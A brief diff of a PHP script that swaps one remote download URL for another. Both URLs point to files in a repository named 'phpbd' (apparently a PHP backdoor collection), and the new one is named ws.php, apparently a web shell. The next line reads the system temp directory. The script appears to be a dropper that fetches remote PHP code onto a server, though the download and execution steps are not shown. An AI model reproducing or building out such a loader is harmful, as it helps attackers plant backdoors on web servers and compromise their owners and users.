@@ -1,6 +1,6 @@
 <?php
 
-$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/nz.php';
+$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/ws.php';
 
 
 $tempDir = sys_get_temp_dir();
